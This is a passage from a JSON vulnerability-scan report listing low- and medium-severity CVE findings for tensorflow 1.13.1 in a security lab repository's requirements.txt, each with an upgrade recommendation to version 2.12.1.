            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29529 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29529](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29529)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "38f8170300fc4e2d6c27f92ac1efa482eef71e5f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29584",
          "ruleIndex": 143,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29584 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29584)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "af6565d8b3c15034439de792e2f35005116cf1ab"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29547",
          "ruleIndex": 144,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29547 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29547](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29547)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6a800de106dee787ab2495a0bcc5acb1ea6c6e6d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29565",
          "ruleIndex": 145,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29565 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29565](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29565)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "69bbca6ebc5eba8a1f48252166f6f29ae0e84ab1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29562",
          "ruleIndex": 146,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29562 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29562)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8bc4120ceaaddce5cc2074c53fb7d9309e5f601f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29571",
          "ruleIndex": 147,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29571 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29571](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29571)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fa9f754804e0300a444ec4aa78925cb83ee66f09"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29536",
          "ruleIndex": 148,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29536 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29536](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29536)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4f262b814a8e7ca18257c471700f93eb16a6c461"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29557",
          "ruleIndex": 149,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29557 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29557](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29557)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f260820e00ee0b41410c91af2c3bfe16aa511d41"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29606",
          "ruleIndex": 150,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29606 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29606](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29606)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "afde9aaa5e97915346baa7c199e446a5cfa765ef"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29594",
          "ruleIndex": 151,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29594 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29594](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29594)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "af98556f7050a3a147838534ab0aaf38b717323a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29605",
          "ruleIndex": 152,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29605 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29605](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29605)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "318a48afa63c90fdc7921b6ee23e6b54b493b978"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29608",
          "ruleIndex": 153,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29608 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29608](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29608)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "00755715e2c2ac8c866be64ac38e455b9b817e4f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29585",
          "ruleIndex": 154,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29585 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29585](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29585)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c2319840f075b60e1267778965b0cc7c45609624"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29570",
          "ruleIndex": 155,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29570 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29570](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29570)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "eff0d134bd34a2c6e350afdf0ed61df26197e64c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29559",
          "ruleIndex": 156,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29559 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29559)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "94a64dfc4518b089e7146e9d1b5f37ef103cf89c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29530",
          "ruleIndex": 157,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29530 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29530](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29530)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "76552063ce823ad51c6649eecbdb798ed9c9a965"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29602",
          "ruleIndex": 158,
          "level": "note",
          "message": {
